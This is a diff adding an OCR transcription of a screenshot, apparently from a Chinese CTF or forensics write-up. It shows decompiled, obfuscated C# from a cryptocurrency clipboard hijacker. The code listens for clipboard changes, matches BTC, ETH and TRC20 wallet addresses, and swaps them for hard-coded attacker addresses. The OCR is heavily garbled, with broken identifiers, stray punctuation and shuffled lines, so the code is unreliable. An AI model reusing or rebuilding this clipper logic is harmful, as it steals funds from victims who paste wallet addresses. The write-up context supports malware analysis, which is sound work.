@@ -1,0 +1,39 @@
+# OCR: Pasted_image_20260416000600.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260416000600.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:45
+
+27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45
+46 47 48 49
+50 51
+52 53 54 55
+56 57 58 59 60 61
+62 63 64 65
+public
+NotificationForm
+7Io8rog4MU8fmcconcdl.NativeMethods.SetParent(this.Handle，7Io8roq4MU8fmcconcdl.NativeMethods.intpreclp) 7Io8roq4MU8fmcconcdl.NativeMethods.AddclipboardFormatListener(this.Handle) :
+// Token: 0x06000128 RID: 296 RVA: 0x00006748 Fi1e 0ffset: 0x00004948 private bool RegexResult(Regex pattern
+return pattern. Match(3NAyE3dwcKMI9nep3gIs. NotificationForm. currentclipboard). Success:
+// Token: 0x06000129 RID: 297 RVA: 0x00006774 File 0ffset: 0x00004974 protected override void wndProc(ref Message m,
+(m. Msg == 797) if
+3NAyE3dwcKMI9nep3gIs.NotificationForm.currentClipboard = swyYmc4huBFAhvYRrG6w.McTTQxHTug0I5tyffXMO
+if (this.RegexResult(7Io8rog4mu8fmcconcdl.S0cI7Hk6bzcFtEvd7Fgm) && !3NAyE3dwcKMI9nep3gIs.NotificationFormcurrentClipboard.Contains
+(statics.bclg2a4jgxmslng5khwvzkt9pechms20ghff42s5g):
+object obj = 7Io8rog4MU8fmcc0ncdl.SQcI7Hk6bzcFtEvd7Fqm.Replace(3NAyE3dwcKMI9nep3gIs.NotificationForm.currentclipboard, statics.bclg2a4jgxslng5khwvzkt9pechms20ghff42s5g) swyYmc4huBFAhYRrG6w.7NuwwoAMdBg5arcFYzH(Conversions.ToString(obj)
+UjyhJt5HwMPb1NLj1RciJIh8GFAVLQ3Nm7iTEwJmi g6qQ49XvHYrDJt9vmfLiSKdftsU4NkQ16mdnmto7u8YYMfuaGGa.E50wBfqykvAB0EeV39c1Z0hgV4FaS1XyNIFDSUeaVC84yrKabmVd1dQiKK6sRr1fIF5AFBW2E5yV
+(Conversions.Tostring(Operators.Concatenateobject("BTc Clipper
++ 3NAyE3dwcKMI9nep3gIs.NotificationForm. currentclipboard +
+if (this.RegexResult(7Io8rog4U8fmcc0ncdl.KsKw6uc5cNpIU5XtEe7i2 && !3NAyE3dwcKMI9nep3gIs.NotificationForm currentclipboard.Contains
+(statics.0x10cE3E5678f40f0B94A2fB5003f04012ecA407C5)）
+，obj)))
+object obj2 = 7Io8roq4MU8fmCC0ncdl.KsKw6uC5CNpIU5XtEe7i.Replace(3NAyE3dwcKMI9nep3gIs.NotificationForm currentC1ipboard, statics.0x10cE3E5678f40f0B94A2fB5003f04012ecA407C5) swyYmc4huBFAhYRrG6w.7NuwwoAMdBg5arcFYzHConversions.ToString(obj2):
+UihJt5HwMPb1NLj1RciJIh8GFAVLQ3Nm7iTEwJmig6gQ49XHYrDIt9mfLiSKdftsU4NkQ16mdnmto7u8YYMfuaGGa.E50wBfgykAB0EeV39c1Z0hgV4FaS1XNIFDSUeaVC84rKabmVdldQiKK6sRr1fIF5AFBW2E5V
+(Conversions.ToString(Operators.ConcatenateObject("ETH Cilipper " + 3NAyE3dwcKMI9nep3gIs.NotificationForm. currentClipboard + "
+，obj2)
+if (this.RegexResult(7Io8rog4MU8fmcc0ncdl.2AsDRG7TDiHYSfLmsTs2) && !3NAyE3dwcKMI9nep3gIs.NotificationForm currentClipboard.Contains(statics.TRc20 Address).
+obiect obi3 = 7Io8rog4mU8fmCc0ncdl.2asDRG7TDiHYSfLmsTs2.Replace(3NavE3dwcKuI9nep3gIs.NotificationForm currentclipboard, statics.TRc2Q address): swvYmC4huBFAhYRrG6w.7NuwwQAlvdBg5arCFYZH(Conversions.T-String(ob i3))
+UjyhJt5HwMPb1NLj1RciJIh8GFAVLQ3Nm7iTEwJmi g6qQ49XvHYrDJt9vmfLiSKdftsU4NkQ16mdnmto7u8YYMfuaGGa.E50wBfqykvAB0EeV39c1Z0hgV4FaS1XyNIFDSUeaVC84yrKabmVd1dQiKK6sRr1fIF5AFBW2E5yV
+(Conversions.ToString(Operators.Concatenateobject("TRc2o Clipper
+base.WndProc(ref m)
++ 3nAyE3dwcKmi9nep3gIs.NotificationForm.currentciipboard +
+，obj3)）)
